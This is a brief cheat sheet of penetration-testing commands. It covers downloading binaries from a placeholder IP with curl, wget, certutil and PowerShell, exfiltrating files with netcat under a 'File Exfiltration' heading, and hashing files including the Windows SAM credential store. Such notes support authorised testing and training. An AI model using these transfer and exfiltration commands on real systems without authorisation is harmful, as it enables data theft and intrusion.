# Transfering Binaries
Linux
```
curl http://<ip>/<file> -o <file path>

wget http://<ip>/<file>
wget http://<ip>/<file> -O <file path>
```


Windows
```
# cmd
certutil -urlcache "http://<ip>/<File>" -o <file path>

# Powershell
iwr -uri http://<ip>/<file> -OutFile <file path>
```

# File Exfiltration

Linux
```
./nc.exe ip port < path-to-file
```

Windows
```
# cmd
nc.exe ip port < path-to-file

# Powershell
cmd /c "nc.exe ip port < path-to-file"
```

# Hash verification

Linux
```
sha256sum <file>
md5sum <file>
```

Windows
```
certutil -hashfile SAM SHA256
certutil -hashfile SAM MD5
```